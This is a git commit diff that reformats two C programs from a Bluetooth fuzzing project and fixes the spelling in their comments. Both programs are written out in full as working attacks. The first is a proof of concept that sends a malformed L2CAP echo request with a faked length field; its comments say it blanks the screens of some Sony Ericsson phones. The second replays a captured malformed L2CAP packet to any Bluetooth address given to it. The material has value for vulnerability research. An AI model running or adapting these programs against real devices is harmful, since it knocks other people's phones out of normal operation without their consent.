d80152a5b083bd15f0b543cdef5b8f955cab458e
minhyuk <minhyuk@live.co.kr>
2024-06-10 11:52:47 +0900

    [Veronica] Code Improvement

--- doc/reset_display_KV600i.c
+++ doc/reset_display_KV600i.c
@@ -4,7 +4,7 @@
 /*	Vulnerability found using BSS fuzzer :			*/
 /*		http://securitech.homeunix.org/blue/		*/
 /*								*/
-/*	Causes anormal behaviours on some Sony/Ericsson 	*/
+/*	Causes an abnormal behaviors on some Sony/Ericsson 	*/
 /*	cell phones 						*/
 /*	Vulnerable tested devices :				*/
 /*		- K 600i					*/
@@ -14,7 +14,7 @@
 /*	Vulnerable devices will slowly turn their screen into 	*/
 /*	black and then display a white screen. 			*/
 /*	After a short period (~45sec), they will go back to 	*/
-/*	their normal behaviour					*/
+/*	their normal behavior					*/
 /*								*/
 /*	gcc -lbluetooth reset_display_K600i.c 			*/
 /*		-o reset_display_K600i				*/
@@ -34,64 +34,65 @@
 
 int main(int argc, char **argv)
 {
-	char *buffer;
-	l2cap_cmd_hdr *cmd;	
-	struct sockaddr_l2 addr;
-	int sock, sent, i;
+    char *buffer;
+    l2cap_cmd_hdr *cmd;
+    struct sockaddr_l2 addr;
+    int sock, sent, i;
 
-	if(argc < 2)
-	{
-		fprintf(stderr, "%s <btaddr>\n", argv[0]);
-		exit(EXIT_FAILURE);
-	}
-	
-	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
-	{
-		perror("socket");
-		exit(EXIT_FAILURE);
-	}
+    if (argc < 2)
+    {
+        fprintf(stderr, "%s <btaddr>\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+    
+    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
+    {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
 
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
+    memset(&addr, 0, sizeof(addr));
+    addr.l2_family = AF_BLUETOOTH;
 
-	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("bind");
-		exit(EXIT_FAILURE);
-	}
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
+    {
+        perror("bind");
+        exit(EXIT_FAILURE);
+    }
 
-	str2ba(argv[1], &addr.l2_bdaddr);
-	
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("connect");
-		exit(EXIT_FAILURE);
-	}
-	
-	if(!(buffer = (char *) malloc ((int) SIZE + 1))) 
-	{
-		perror("malloc");
-		exit(EXIT_FAILURE);
-	}
-	
-	memset(buffer, 'A', SIZE);
+    str2ba(argv[1], &addr.l2_bdaddr);
+    
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
+    {
+        perror("connect");
+        exit(EXIT_FAILURE);
+    }
+    
+    if (!(buffer = (char *)malloc((int)SIZE + 1)) )
+    {
+        perror("malloc");
+        exit(EXIT_FAILURE);
+    }
+    
+    memset(buffer, 'A', SIZE);
 
-	cmd = (l2cap_cmd_hdr *) buffer;
-	cmd->code = L2CAP_ECHO_REQ;
-	cmd->ident = 1;
-	cmd->len = FAKE_SIZE;
-	
-	if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
-	{
-		printf("L2CAP packet sent (%d)\n", sent);
-	}
+    cmd = (l2cap_cmd_hdr *)buffer;
+    cmd->code = L2CAP_ECHO_REQ;
+    cmd->ident = 1;
+    cmd->len = FAKE_SIZE;
+    
+    if ((sent = send(sock, buffer, SIZE, 0)) >= 0)
+    {
+        printf("L2CAP packet sent (%d)\n", sent);
+    }
 
-	printf("Buffer:\t");
-	for(i=0; i<sent; i++)
-		printf("%.2X ", (unsigned char) buffer[i]);
-	printf("\n");
+    printf("Buffer:\t");
+    for (i = 0; i < sent; i++)
+        printf("%.2X ", (unsigned char)buffer[i]);
+    printf("\n");
 
-	free(buffer);
-	close(sock);
-	return EXIT_SUCCESS;
+    free(buffer);
+    close(sock);
+    return EXIT_SUCCESS;
 }
+
--- replay_packet/replay_l2cap_packet.c
+++ replay_packet/replay_l2cap_packet.c
@@ -36,52 +36,53 @@
 #include <bluetooth/l2cap.h>
 
 #define SIZE		12
-char replay_buggy_packet[]="\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";
+char replay_buggy_packet[] = "\xB1\x01\xDB\x69\x94\x5C\x07\x4E\x0D\x9B\x2E\xF1";
 
 int main(int argc, char **argv)
 {
-	struct sockaddr_l2 addr;
-	int sock, sent, i;
+    struct sockaddr_l2 addr;
+    int sock, sent, i;
 
-	if(argc < 2)
-	{
-		fprintf(stderr, "%s <btaddr>\n", argv[0]);
-		exit(EXIT_FAILURE);
-	}
-	
-	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
-	{
-		perror("socket");
-		exit(EXIT_FAILURE);
-	}
+    if (argc < 2)
+    {
+        fprintf(stderr, "%s <btaddr>\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+    
+    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
+    {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
 
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
+    memset(&addr, 0, sizeof(addr));
+    addr.l2_family = AF_BLUETOOTH;
 
-	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("bind");
-		exit(EXIT_FAILURE);
-	}
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
+    {
+        perror("bind");
+        exit(EXIT_FAILURE);
+    }
 
-	str2ba(argv[1], &addr.l2_bdaddr);
-	
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
-	{
-		perror("connect");
-		exit(EXIT_FAILURE);
-	}
-	
-	if( (sent=send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
-	{
-		printf("L2CAP packet sent (%d)\n", sent);
-	}
+    str2ba(argv[1], &addr.l2_bdaddr);
+    
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
+    {
+        perror("connect");
+        exit(EXIT_FAILURE);
+    }
+    
+    if ((sent = send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
+    {
+        printf("L2CAP packet sent (%d)\n", sent);
+    }
 
-	printf("Buffer:\t");
-	for(i=0; i<sent; i++)
-		printf("%.2X ", (unsigned char) replay_buggy_packet[i]);
-	printf("\n");
+    printf("Buffer:\t");
+    for (i = 0; i < sent; i++)
+        printf("%.2X ", (unsigned char)replay_buggy_packet[i]);
+    printf("\n");
 
-	close(sock);
-	return EXIT_SUCCESS;
+    close(sock);
+    return EXIT_SUCCESS;
 }
+
